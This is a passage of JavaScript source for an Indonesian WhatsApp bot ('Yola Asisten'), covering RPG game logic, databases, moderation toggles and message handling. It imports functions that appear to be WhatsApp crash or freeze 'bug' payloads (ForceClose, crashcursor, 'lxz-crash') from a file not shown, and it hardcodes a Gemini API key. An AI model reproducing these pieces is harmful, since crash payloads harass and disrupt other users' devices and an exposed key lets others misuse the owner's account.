const FormData = require("form-data");
const fs = require("fs");
const crypto = require("crypto");
const axios = require("axios");
const {
    GoogleGenerativeAI
} = require("@google/generative-ai");
const jimp = require("jimp");
const util = require("util");
const os = require("os");
const chalk = require("chalk");
const {
    performance
} = require("perf_hooks");
const didyoumean = require("didyoumean");
const similarity = require("similarity");
const path = require("path");
const {
    Sticker
} = require("wa-sticker-formatter");
const dns = require('dns').promises;
const yts = require("yt-search");

const {
    delaynew,
    DelayL,
    SqlXVnm31,
    WaApi,
    satan,
    ForceClose,
    Xforceui,
    LayX,
    OverloadCursor,
    crashcursor,
    SpaceGroup,
    mentionSw,
} = require("./system/bug.js");
const {
    generateWAMessageContent,
    downloadMediaMessage,
    generateWAMessageFromContent,
    proto,
    prepareWAMessageMedia,
    getDevice,
} = require("@whiskeysockets/baileys");
const {
    runtime,
    getRandom,
    getTime,
    tanggal,
    toRupiah,
    ucapan,
    generateProfilePicture,
    getBuffer,
    fetchJson,
    resize,
    sleep,
} = require("./system/function.js");
const {
    roles: availableRolesData,
    items: rpgItems,
    dungeons: rpgDungeons,
    quests: rpgQuests,
    houses: rpgHouses,
    jobs: rpgJobs
} = require("./system/rpgData.js");


const DB_DIR = "./database";
const TMP_DIR = "./tmp";

const YOLA_THUMBNAILS = [
    "https://files.catbox.moe/gwx59h.jpg",
    "https://files.catbox.moe/1vl5tv.mp4",
    "https://qu.ax/Jmico.jpg",
    "https://qu.ax/qjLbo.jpg",
    "https://qu.ax/SbRzE.jpg"
];

const MENU_THUMBNAILS = {
  
};


const getRandomThumbnailUrl = () => YOLA_THUMBNAILS[Math.floor(Math.random() * YOLA_THUMBNAILS.length)];
const DEFAULT_PFP_URL = "https://files.catbox.moe/gwx59h.jpg";
const GEMINI_API_KEY = "AIzaSyDj12F5OoKh0iuVwDYwKPzvq0ozP41D30o";
const GEMINI_MODEL = "gemini-2.5-flash-preview-05-20";
const GEMINI_API_URL = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`;

const filePaths = {
    YOLA_AI_CONFIG_PATH: path.join(DB_DIR, "yola_ai_config.json"),
    YOLA_CHAT_HISTORY_PATH: path.join(DB_DIR, "yola_chat_history.json"),
    PREMIUM_DB_PATH: path.join(DB_DIR, "premium.json"),
    USERS_DB_PATH: path.join(DB_DIR, "users.json"),
    GUILDS_DB_PATH: path.join(DB_DIR, "guilds.json"),
    PARTIES_DB_PATH: path.join(DB_DIR, "parties.json"),
    NOTIF_ADZAN_GROUPS_PATH: path.join(DB_DIR, "notifadzan_groups.json"),
    MENU_STYLE_PATH: path.join(DB_DIR, "menustyle.json"),
    BADWORDS_PATH: path.join(DB_DIR, "badwords.json"),
    ANTIVIRTEX_PATH: path.join(DB_DIR, "antivirus.json"),
    ANTITOXIC_PATH: path.join(DB_DIR, "antitoxic.json"),
    ANTIWAME_PATH: path.join(DB_DIR, "antiwame.json"),
    ANTILINKGC_PATH: path.join(DB_DIR, "antilinkgc.json"),
    ANTILINKALL_PATH: path.join(DB_DIR, "antilinkall.json"),
    ANTIASING_PATH: path.join(DB_DIR, "antiasing.json"),
    OWNER_JSON_PATH: path.join(DB_DIR, "owner.json"),
    PENDING_TRADES_PATH: path.join(DB_DIR, "pending_trades.json"),
    RPG_COUNTER_PATH: path.join(DB_DIR, "rpg_counter.json"),
    PARTY_INVITES_PATH: path.join(DB_DIR, "party_invites.json"),
    PENDING_PROPOSALS_PATH: path.join(DB_DIR, "pending_proposals.json"),
    PENDING_SEKS_REQUESTS_PATH: path.join(DB_DIR, "pending_seks_requests.json"),
    ACTIVE_DUNGEONS_PATH: path.join(DB_DIR, "active_dungeons.json"),
    ACTIVE_QUESTS_PATH: path.join(DB_DIR, "active_quests.json"),
    CUSTOM_CASES_PATH: path.join(DB_DIR, "custom_cases.json"),
    PENDING_CONFESS_PATH: path.join(DB_DIR, "pending_confess.json"),
};

function ensureDir(dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, {
            recursive: true
        });
    }
}
ensureDir(DB_DIR);
ensureDir(TMP_DIR);

function loadConfig(filePath, defaultConfig = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath, "utf8");
            return data ? JSON.parse(data) : defaultConfig;
        } else {
            saveConfig(filePath, defaultConfig);
            return defaultConfig;
        }
    } catch (e) {
        try {
            saveConfig(filePath, defaultConfig);
        } catch (saveErr) {}
        return defaultConfig;
    }
}

function saveConfig(filePath, config) {
    try {
        const dataString = JSON.stringify(config, null, 2);
        fs.writeFileSync(filePath, dataString);
        if (!fs.existsSync(filePath)) {
            throw new Error(`File not found after attempting to save: ${filePath}`);
        }
    } catch (e) {}
}

let yolaAiConfig = loadConfig(filePaths.YOLA_AI_CONFIG_PATH, {
    enabled: false
});
let yolaChatHistories = loadConfig(filePaths.YOLA_CHAT_HISTORY_PATH, {});
let Premium = loadConfig(filePaths.PREMIUM_DB_PATH, []);
let registeredUsers = loadConfig(filePaths.USERS_DB_PATH, {});
let guilds = loadConfig(filePaths.GUILDS_DB_PATH, {});
let parties = loadConfig(filePaths.PARTIES_DB_PATH, {});
let NotifAdzanGroups = loadConfig(filePaths.NOTIF_ADZAN_GROUPS_PATH, []);
let currentMenuStyleConfig = loadConfig(filePaths.MENU_STYLE_PATH, {
    style: 'V1'
});
let currentMenuStyle = currentMenuStyleConfig.style || 'V1';
let badwords = loadConfig(filePaths.BADWORDS_PATH, []);
let ntvirtex = loadConfig(filePaths.ANTIVIRTEX_PATH, []);
let nttoxic = loadConfig(filePaths.ANTITOXIC_PATH, []);
let ntwame = loadConfig(filePaths.ANTIWAME_PATH, []);
let ntilinkgc = loadConfig(filePaths.ANTILINKGC_PATH, []);
let ntilinkall = loadConfig(filePaths.ANTILINKALL_PATH, []);
let ntasing = loadConfig(filePaths.ANTIASING_PATH, []);
let OwnerR = loadConfig(filePaths.OWNER_JSON_PATH, []);
let pendingTrades = loadConfig(filePaths.PENDING_TRADES_PATH, {});
let rpgCounter = loadConfig(filePaths.RPG_COUNTER_PATH, {
    lastUserId: 0,
    lastGuildId: 0,
    lastPartyId: 0
});
let partyInvites = loadConfig(filePaths.PARTY_INVITES_PATH, {});
let pendingProposals = loadConfig(filePaths.PENDING_PROPOSALS_PATH, {});
let pendingSeksRequests = loadConfig(filePaths.PENDING_SEKS_REQUESTS_PATH, {});
let activeDungeons = loadConfig(filePaths.ACTIVE_DUNGEONS_PATH, {});
let activeQuests = loadConfig(filePaths.ACTIVE_QUESTS_PATH, {});
let customCases = loadConfig(filePaths.CUSTOM_CASES_PATH, {});
let pendingConfesses = loadConfig(filePaths.PENDING_CONFESS_PATH, {});


const savePremiumUsers = (users) => saveConfig(filePaths.PREMIUM_DB_PATH, users);
const saveUsers = (currentUserJidForLog = 'Unknown') => {
    saveConfig(filePaths.USERS_DB_PATH, registeredUsers);
};
const saveGuilds = () => saveConfig(filePaths.GUILDS_DB_PATH, guilds);
const saveParties = () => saveConfig(filePaths.PARTIES_DB_PATH, parties);
const saveNotifAdzanGroups = (groups) => saveConfig(filePaths.NOTIF_ADZAN_GROUPS_PATH, groups);
const saveMenuStyle = () => saveConfig(filePaths.MENU_STYLE_PATH, {
    style: currentMenuStyle
});
const saveBadwords = () => saveConfig(filePaths.BADWORDS_PATH, badwords);
const saveAntiVirtex = () => saveConfig(filePaths.ANTIVIRTEX_PATH, ntvirtex);
const saveAntiToxic = () => saveConfig(filePaths.ANTITOXIC_PATH, nttoxic);
const saveAntiWame = () => saveConfig(filePaths.ANTIWAME_PATH, ntwame);
const saveAntiLinkGc = () => saveConfig(filePaths.ANTILINKGC_PATH, ntilinkgc);
const saveAntiLinkAll = () => saveConfig(filePaths.ANTILINKALL_PATH, ntilinkall);
const saveAntiAsing = () => saveConfig(filePaths.ANTIASING_PATH, ntasing);
const savePendingTrades = () => saveConfig(filePaths.PENDING_TRADES_PATH, pendingTrades);
const saveRpgCounter = () => saveConfig(filePaths.RPG_COUNTER_PATH, rpgCounter);
const savePartyInvites = () => saveConfig(filePaths.PARTY_INVITES_PATH, partyInvites);
const savePendingProposals = () => saveConfig(filePaths.PENDING_PROPOSALS_PATH, pendingProposals);
const savePendingSeksRequests = () => saveConfig(filePaths.PENDING_SEKS_REQUESTS_PATH, pendingSeksRequests);
const saveActiveDungeons = () => saveConfig(filePaths.ACTIVE_DUNGEONS_PATH, activeDungeons);
const saveActiveQuests = () => saveConfig(filePaths.ACTIVE_QUESTS_PATH, activeQuests);
const saveYolaAiConfig = () => saveConfig(filePaths.YOLA_AI_CONFIG_PATH, yolaAiConfig);
const saveYolaChatHistories = () => saveConfig(filePaths.YOLA_CHAT_HISTORY_PATH, yolaChatHistories);
const saveCustomCases = () => saveConfig(filePaths.CUSTOM_CASES_PATH, customCases);
const savePendingConfesses = () => saveConfig(filePaths.PENDING_CONFESS_PATH, pendingConfesses);


const availableBugTypes = ["lxz-crash", "lxz-fc", "lxz-papan", "lxz-layy", "lxz-hmph"];
const availableRoles = Object.keys(availableRolesData);
const genders = ['pria', 'wanita'];
const rankThresholds = {
    G: 0,
    F: 500,
    E: 1000,
    D: 5000,
    C: 15000,
    B: 50000,
    A: 150000,
    S: 500000,
    SS: 1500000,
    SSS: 5000000
};
const xpPerLevelBase = 100;
const GUILD_MAX_MEMBERS = 20;
const PARTY_MAX_MEMBERS = 8;
const GUILD_CREATE_COST = 1500;
const PARTY_CREATE_COST = 100;
const LICENSE_LEVEL_REQ = 5;
const DUNGEON_PARTY_MULTIPLIER = 1.2;
const SEKS_COOLDOWN = 300000;
const JOB_COOLDOWN = 15000;
const BOT_GLOBAL_COOLDOWN = 1000;
const USER_COMMAND_COOLDOWN = 3000;
const UPRANK_GOLD_COST = 1000;
let lastCommandTimestamp = 0;
const userLastCommandTimestamps = {};

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRankByTotalXp(totalXp) {
    let currentRank = 'G';
    const xp = totalXp || 0;
    for (const rank in rankThresholds) {
        if (xp >= rankThresholds[rank]) currentRank = rank;
        else break;
    }
    return currentRank;
}

function xpForNextLevel(level) {
    return Math.floor(xpPerLevelBase * Math.pow(level, 1.5));
}

function getGreeting() {
    const hours = new Date().getHours();
    if (hours >= 4 && hours < 10) return "Ohayō Gozaimasu 🌅";
    if (hours >= 10 && hours < 15) return "Konnichiwa ☀️";
    if (hours >= 15 && hours < 18) return "Konnichiwa 🌇";
    if (hours >= 18 && hours < 24) return "Konbanwa 🌃";
    return "Oyasuminasai 🌌";
}

const defaultContextInfoBuilder = (pushname, menuCommandForThumbnail = null) => {
    let currentThumbnailUrl = getRandomThumbnailUrl();
    if (menuCommandForThumbnail && MENU_THUMBNAILS[menuCommandForThumbnail]) {
        currentThumbnailUrl = MENU_THUMBNAILS[menuCommandForThumbnail];
    }

    return {
        externalAdReply: {
            containsAutoReply: true,
            title: `Yola Asisten`,
            body: `by ThanDz| ${getGreeting()} ${pushname || 'User'}`,
            previewType: "PHOTO",
            thumbnailUrl: "https://files.catbox.moe/gwx59h.jpg",
            sourceUrl: `https://w.ceo/YolaAssistant`
        }
    };
};

function initializeUserRPG(userId, name, age, role, gender) {
    rpgCounter.lastUserId++;
    const newUserRPGID = rpgCounter.lastUserId;
    saveRpgCounter();
    if (!registeredUsers[userId]) {
        registeredUsers[userId] = {};
    }
    const userEntry = registeredUsers[userId];

    userEntry.name = name;
    userEntry.age = age;
    userEntry.rpgId = newUserRPGID;
    userEntry.gender = gender;
    userEntry.registeredDate = new Date().toISOString();
    userEntry.registration_pending = undefined;
    userEntry.rpg = {};
    const rpg = userEntry.rpg;

    const roleData = availableRolesData[role];
    if (!roleData) {
        const defaultRole = Object.keys(availableRolesData)[0] || 'warrior';
        rpg.role = defaultRole;
        const defaultRoleData = availableRolesData[defaultRole] || {
            baseStats: {
                maxHp: 100,
                maxMp: 50,
                atk: 10,
                def: 5
            }
        };
        rpg.maxHp = defaultRoleData.baseStats.maxHp;
        rpg.hp = rpg.maxHp;
        rpg.maxMp = defaultRoleData.baseStats.maxMp;
        rpg.mp = rpg.maxMp;
        rpg.atk = defaultRoleData.baseStats.atk;
        rpg.def = defaultRoleData.baseStats.def;
    } else {
        rpg.role = role;
        rpg.maxHp = roleData.baseStats.maxHp;
        rpg.hp = rpg.maxHp;
        rpg.maxMp = roleData.baseStats.maxMp;
        rpg.mp = rpg.mp;
        rpg.atk = roleData.baseStats.atk;
        rpg.def = roleData.baseStats.def;
    }
    rpg.level = 1;
    rpg.xp = 0;
    rpg.totalXpEarned = 0;
    rpg.rank = 'G';
    rpg.xpRequired = xpForNextLevel(1);
    rpg.currency = {
        gold: 100,
        silver: 0,
        emerald: 0,
        ruby: 0,
        sapphire: 0,
        diamond: 0
    };
    rpg.inventory = {};
    rpg.equipment = {
        weapon: null,
        armor: null,
        shield: null
    };
    rpg.spouse = null;
    rpg.quest = null;
    rpg.lastDungeon = {};
    rpg.lastHeal = 0;
    rpg.partyId = null;
    rpg.guildId = null;
    rpg.license = false;
    rpg.questProgress = {};
    rpg.currentAction = null;
    rpg.pendingAction = null;
    rpg.completedQuests = {};
    rpg.houseId = null;
    rpg.lastSeksTimestamp = 0;
    rpg.lastJobTimestamp = 0;
    rpg.currentJob = null;

    const bonusGold = generateRandomNumber(50, 150);
    const bonusPotion = generateRandomNumber(1, 3);
    rpg.currency.gold += bonusGold;
    rpg.inventory['potion'] = (rpg.inventory['potion'] || 0) + bonusPotion;

    let bonusMsg = `🪙 Bonus: *${bonusGold} Emas* & *${bonusPotion}x Potion*!\n🆔 ID Petualang: *${newUserRPGID}*`;
    return bonusMsg;
}

function findUserByRPGID(rpgIdToFind) {
    const numericId = parseInt(rpgIdToFind);
    if (isNaN(numericId)) return null;
    for (const jid in registeredUsers) {
        if (registeredUsers[jid]?.rpgId === numericId) {
            return jid;
        }
    }
    return null;
}

function findUserJid(input, m) {
    if (!input) return null;
    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
    if (mentioned) return mentioned;
    const rpgIdUser = findUserByRPGID(input);
    if (rpgIdUser) return rpgIdUser;
    const potentialJid = input.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (potentialJid.length > 10) {
        if (registeredUsers[potentialJid]) return potentialJid;
    }
    return null;
}

function isQuestCompleted(userId, questId) {
    const user = registeredUsers[userId];
    if (!user?.rpg?.quest || user.rpg.quest !== questId) return false;
    const quest = rpgQuests[questId];
    if (!quest) return false;
    if (!user.rpg.questProgress || !user.rpg.questProgress[questId]) return false;

    const questProgress = user.rpg.questProgress[questId];
    for (const objective of quest.objectives) {
        const objectiveKey = `${objective.type}_${Array.isArray(objective.target) ? objective.target.join('+') : objective.target}`;
        const currentCount = questProgress[objectiveKey] || 0;
        const requiredCount = objective.count;
        if (currentCount < requiredCount) return false;
    }

    if (user.rpg.currentAction?.type === 'quest_active' &&
        user.rpg.currentAction?.questId === questId &&
        Date.now() < user.rpg.currentAction?.endTime) {
        return false;
    }
    return true;
}


function updateQuestProgress(userId, actionType, targetData, count = 1) {
    const user = registeredUsers[userId];
    if (!user?.rpg?.quest) return null;
    const rpgData = user.rpg;
    const questId = rpgData.quest;
    const quest = rpgQuests[questId];
    if (!quest || !rpgData.questProgress) return null;
    if (!rpgData.questProgress[questId]) rpgData.questProgress[questId] = {};
    let questProgress = rpgData.questProgress[questId];
    let updated = false;
    let objectiveMet = null;

    for (const objective of quest.objectives) {
        const objectiveKey = `${objective.type}_${Array.isArray(objective.target) ? objective.target.join('+') : objective.target}`;
        if (objective.type === actionType) {
            let match = false;
            if (Array.isArray(objective.target)) {
                match = objective.target.some(t => t.toLowerCase() === targetData.target.toLowerCase());
            } else {
                match = objective.target.toLowerCase() === targetData.target.toLowerCase();
            }
            if (match && (!objective.location || objective.location === targetData.location)) {
                const currentCount = questProgress[objectiveKey] || 0;
                const requiredCount = objective.count;
                if (currentCount < requiredCount) {
                    questProgress[objectiveKey] = Math.min(requiredCount, currentCount + count);
                    updated = true;
                    objectiveMet = objective;
                    break;
                }
            }
        }
    }
    if (updated) {
        saveUsers(userId);
        return objectiveMet;
    }
    return null;
}


function calculateStats(rpgData) {
     const roleData = availableRolesData[rpgData.role];
     if (!roleData) {
         return {
             maxHp: rpgData.maxHp || 100,
             hp: rpgData.hp || 100,
             maxMp: rpgData.maxMp || 50,
             mp: rpgData.mp || 50,
             atk: rpgData.atk || 10,
             def: rpgData.def || 5
         };
     }

     let maxHp = roleData.baseStats.maxHp + Math.floor(roleData.baseStats.maxHp * 0.1 * (rpgData.level - 1));
     let maxMp = roleData.baseStats.maxMp + Math.floor(roleData.baseStats.maxMp * 0.1 * (rpgData.level - 1));
     let atk = roleData.baseStats.atk + Math.floor(roleData.baseStats.atk * 0.08 * (rpgData.level - 1));
     let def = roleData.baseStats.def + Math.floor(roleData.baseStats.def * 0.08 * (rpgData.level - 1));


     if (rpgData.equipment?.weapon) {
         const weapon = rpgItems[rpgData.equipment.weapon];
         if (weapon?.stats?.atk) atk += weapon.stats.atk;
     }
     if (rpgData.equipment?.armor) {
         const armor = rpgItems[rpgData.equipment.armor];
         if (armor?.stats?.def) def += armor.stats.def;
     }
     if (rpgData.equipment?.shield) {
         const shield = rpgItems[rpgData.equipment.shield];
         if (shield?.stats?.def) def += shield.stats.def;
     }


     return {
         maxHp: maxHp,
         hp: rpgData.hp || maxHp,
         maxMp: maxMp,
         mp: rpgData.mp || maxMp,
         atk: atk,
         def: def
     };
 }


function checkForLevelUp(userId, replyFn) {
    const user = registeredUsers[userId];
    if (!user?.rpg) return false;
    const rpg = user.rpg;
    let leveledUp = false;
    let oldLevel = rpg.level;
    let oldRank = rpg.rank;

    while ((rpg.xp || 0) >= (rpg.xpRequired || xpForNextLevel(rpg.level || 1))) {
        rpg.xp -= rpg.xpRequired;
        rpg.level++;
        leveledUp = true;

        const updatedStats = calculateStats(rpg);
        rpg.maxHp = updatedStats.maxHp;
        rpg.hp = rpg.maxHp;
        rpg.maxMp = updatedStats.maxMp;
        rpg.mp = rpg.maxMp;
        rpg.atk = updatedStats.atk;
        rpg.def = updatedStats.def;

        rpg.xpRequired = xpForNextLevel(rpg.level);
        rpg.rank = getRankByTotalXp(rpg.totalXpEarned);
    }
    if (leveledUp) {
        saveUsers(userId);
        let levelUpMsg = `✨🎉 Selamat, Kak ${user.name}! Kakak berhasil naik ke *Level ${rpg.level}*! 🎉✨`;
        if (rpg.rank !== oldRank) {
            levelUpMsg += `\nDan kerennya lagi, Kakak juga naik *Rank* menjadi *${rpg.rank}*! Hebat banget! 🏆`;
        }
        replyFn(levelUpMsg);
    }
    return leveledUp;
}


function formatCurrency(currencyObj) {
    let str = "";
    const currencyOrder = ['diamond', 'ruby', 'emerald', 'sapphire', 'gold', 'silver'];
    const currencyEmoji = {
        gold: '🪙',
        silver: '🔘',
        emerald: '✳️',
        ruby: '♦️',
        sapphire: '💠',
        diamond: '💎'
    };
    for (const key of currencyOrder) {
        if (currencyObj && currencyObj[key] && currencyObj[key] > 0) {
            str += `${currencyEmoji[key] || ''}${toRupiah(currencyObj[key])} ${capital(key)} | `;
        }
    }
    return str.length > 0 ? str.slice(0, -3) : "Tidak Punya Uang";
}

function capital(string) {
    return string ? string.charAt(0).toUpperCase() + string.slice(1) : '';
}

async function Uguu(buffer, filename) {
    const form = new FormData();
    form.append('files[]', buffer, {
        filename
    });
    try {
        let {
            data
        } = await axios.post('https://uguu.se/upload.php', form, {
            headers: form.getHeaders()
        });
        if (!data.files || !data.files[0]) throw new Error('Upload gagal: Respons API Uguu tidak valid');
        return data.files[0].url;
    } catch (error) {
        throw new Error(`Upload Uguu gagal: ${error.message}`);
    }
}

function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())];
}
async function CatBox(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File not found");
        const form = new FormData();
        form.append("reqtype", "fileupload");
        form.append("fileToUpload", fs.createReadStream(filePath));
        const response = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: {
                ...form.getHeaders(),
                timeout: 15000
            }
        });
        if (response.status === 200 && response.data && typeof response.data === 'string' && response.data.startsWith('http')) return response.data.trim();
        else throw new Error(`Upload failed: Status ${response.status}, Data: ${response.data}`);
    } catch (err) {
        if (err.code === 'ETIMEDOUT' || err.message.includes('timeout')) {
            throw new Error(`Upload Catbox failed: Connection timed out`);
        }
        throw new Error(`Upload Catbox failed: ${err.message || err}`);
    }
}

function randomNomor(min, max = null) {
    if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    } else {
        return Math.floor(Math.random() * min) + 1;
    }
}
async function parseMention(text = "") {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map((v) => v[1] + "@s.whatsapp.net");
}

var prefix = '.';

module.exports = async (yola, m, store) => {
    if (m.key.fromMe) return;
    yola.autosholat = yola.autosholat ? yola.autosholat : {};
    let id = m.chat;

    if (id in yola.autosholat) {
    } else {
        let jadwalSholat = {
            Shubuh: "04:16",
            Dhuha: "05:34",
            Dzuhur: "11:37",
            Ashar: "14:49",
            Maghrib: "17:41",
            Isyak: "18:50",
            Tahajud: "01:55"
        };

        const date = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const hours = date.getHours();
        const minutes = date.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

        if (NotifAdzanGroups.includes(m.chat)) {
            for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
                if (timeNow === waktu) {
                    try {
                        await yola.sendMessage(m.chat, {
                            audio: { url: 'https://cloudkuimages.guru/uploads/audios/681b216fc07b1.mp3' },
                            mimetype: 'audio/mpeg',
                            ptt: true,
                            contextInfo: {
                                externalAdReply: {
                                    title: `Waktu Sholat ${sholat}`,
                                    body: `Pengingat sholat untuk wilayah Surabaya dan sekitarnya...`,
                                    thumbnailUrl: 'https://cloudkuimages.guru/uploads/images/681b20bed2edf.jpg',
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    sourceUrl: 'Yola Assistant'
                                }
                            }
                        });
                        yola.autosholat[id] = setTimeout(() => {
                            delete yola.autosholat[id];
                        }, 57000);
                    } catch (e) {
                    }
                }
            }
        }
    }


    try {
        var body = m.mtype === "conversation" && m.message.conversation ? m.message.conversation : m.mtype == "imageMessage" && m.message.imageMessage.caption ? m.message.imageMessage.caption : m.mtype == "documentMessage" && m.message.documentMessage.caption ? m.message.documentMessage.caption : m.mtype == "videoMessage" && m.message.videoMessage.caption ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" && m.message.listResponseMessage.singleSelectReply?.selectedRowId ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "interactiveResponseMessage" && m.message.interactiveResponseMessage.nativeFlowResponseMessage?.paramsJson && JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype == "interactiveResponseMessage" && m.message.interactiveResponseMessage.buttonResponseMessage?.selectedButtonId ? m.message.interactiveResponseMessage.buttonResponseMessage.selectedButtonId : m.mtype == "templateButtonReplyMessage" && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : "";
        var budy = typeof m.text == 'string' ? m.text : '';
        if (!body && budy) body = budy;

        if (!m.key.fromMe && m.chat.endsWith('@s.whatsapp.net') || m.isGroup) {
             await yola.readMessages([m.key]).catch(e => {});
        }

        prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi)[0] : '.';
        var isCmd = body.startsWith(prefix);
        var command = isCmd ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
        var args = body.trim().split(/ +/).slice(1);
        var q = args.join(" ");
        var text = q;

        const botNumber = await yola.decodeJid(yola.user.id);
        const pushname = m.pushName || `${m.sender.split("@")[0]}`;
        const isBot = botNumber.includes(m.sender);
        OwnerR = loadConfig(filePaths.OWNER_JSON_PATH, []);
        Premium = loadConfig(filePaths.PREMIUM_DB_PATH, []);
        const isOwner = [botNumber, ...OwnerR, ...global.owner.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
        const isPremium = Premium.includes(m.sender) || isOwner;
        const from = m.chat;
        const namabot = yola.user?.name || "Yola Asisten";
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted)?.mimetype || "";

        registeredUsers = loadConfig(filePaths.USERS_DB_PATH, {});
        guilds = loadConfig(filePaths.GUILDS_DB_PATH, {});
        parties = loadConfig(filePaths.PARTIES_DB_PATH, {});
        partyInvites = loadConfig(filePaths.PARTY_INVITES_PATH, {});
        pendingTrades = loadConfig(filePaths.PENDING_TRADES_PATH, {});
        pendingProposals = loadConfig(filePaths.PENDING_PROPOSALS_PATH, {});
        pendingSeksRequests = loadConfig(filePaths.PENDING_SEKS_REQUESTS_PATH, {});
        activeDungeons = loadConfig(filePaths.ACTIVE_DUNGEONS_PATH, {});
        activeQuests = loadConfig(filePaths.ACTIVE_QUESTS_PATH, {});
        rpgCounter = loadConfig(filePaths.RPG_COUNTER_PATH, {
            lastUserId: 0,
            lastGuildId: 0,
            lastPartyId: 0
        });
        yolaAiConfig = loadConfig(filePaths.YOLA_AI_CONFIG_PATH, {
            enabled: false
        });
        yolaChatHistories = loadConfig(filePaths.YOLA_CHAT_HISTORY_PATH, {});
        customCases = loadConfig(filePaths.CUSTOM_CASES_PATH, {});
        pendingConfesses = loadConfig(filePaths.PENDING_CONFESS_PATH, {});


        const isRegistered = !!registeredUsers[m.sender]?.rpg;
        const userRPG = registeredUsers[m.sender]?.rpg;
        const makeid = crypto.randomBytes(3).toString("hex");

        m.isGroup = m.chat.endsWith("g.us");
        try {
            m.metadata = m.isGroup ? await yola.groupMetadata(m.chat) : {};
            if (!m.metadata) m.metadata = {};
        } catch (metaErr) {
            m.metadata = {};
        }
        const participants = m.isGroup && Array.isArray(m.metadata?.participants) ? m.metadata.participants : [];
        m.isAdmin = m.isGroup ? !!participants.find((p) => p.id === m.sender)?.admin : false;
        m.isBotAdmin = m.isGroup ? !!participants.find((p) => p.id === botNumber)?.admin : false;

        ntvirtex = loadConfig(filePaths.ANTIVIRTEX_PATH, []);
        ntwame = loadConfig(filePaths.ANTIWAME_PATH, []);
        nttoxic = loadConfig(filePaths.ANTITOXIC_PATH, []);
        ntasing = loadConfig(filePaths.ANTIASING_PATH, []);
        ntilinkall = loadConfig(filePaths.ANTILINKALL_PATH, []);
        ntilinkgc = loadConfig(filePaths.ANTILINKGC_PATH, []);
        badwords = loadConfig(filePaths.BADWORDS_PATH, []);
        customCases = loadConfig(filePaths.CUSTOM_CASES_PATH, {});


        const mentions = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0 ? m.message.extendedTextMessage.contextInfo.mentionedJid : m.message.extendedTextMessage?.contextInfo?.participant ? [m.message.extendedTextMessage.contextInfo.participant] : []
        const nameMention = (budy && (budy?.toLowerCase(). includes('yola') || budy?.toLowerCase(). includes('yol')))
        const isReplyToBot = m.quoted?.sender === botNumber;
        const isTalkingToBot = !m.key.fromMe && ((!m.isGroup && yolaAiConfig.enabled) || (m.isGroup && yolaAiConfig.enabled && (mentions.includes(botNumber) || nameMention || isReplyToBot)));


        const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false;
        const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false;
        const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false;
        const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false;
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false;
        const AntiLinkGc = m.isGroup ? ntilinkgc.includes(m.chat) : false;


        const reply = async (teks, contextInfo = {}, options = {}) => {
            const currentPushname = m?.pushName || `${m?.sender?.split("@")[0]}`;
            const currentCommandForThumb = command || (yolaAiConfig.enabled && m.isGroup ? 'aimenu' : null);

            let baseContext = {};
            if (!contextInfo.disableDefaultContext) {
                baseContext = defaultContextInfoBuilder(currentPushname, currentCommandForThumb);
            }

            const finalContextInfo = {
                ...baseContext,
                ...contextInfo,
                ...(contextInfo.externalAdReply ? {
                    externalAdReply: {
                        ...baseContext.externalAdReply,
                        ...contextInfo.externalAdReply,
                        thumbnailUrl: contextInfo.externalAdReply.thumbnailUrl || baseContext.externalAdReply?.thumbnailUrl
                    }
                } : {}),
                mentionedJid: Array.from(new Set([m?.sender, ...(contextInfo.mentionedJid || [])])).filter(jid => jid)
            };


            if (finalContextInfo.disableDefaultContext !== undefined) {
                delete finalContextInfo.disableDefaultContext;
            }
            if (Object.keys(finalContextInfo.externalAdReply || {}).length === 0) {
                delete finalContextInfo.externalAdReply;
            }
            if (finalContextInfo.mentionedJid?.length === 0) {
                delete finalContextInfo.mentionedJid;
            }
            return yola.sendMessage(m.chat, {
                text: teks,
                contextInfo: finalContextInfo
            }, {
                quoted: m,
                ...options
            });
        };

        let qstoreThumbBuffer = null;
        try {
            const tempThumb = await getBuffer(getRandomThumbnailUrl());
            if (tempThumb) qstoreThumbBuffer = tempThumb;
        } catch {}

        const qstore = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
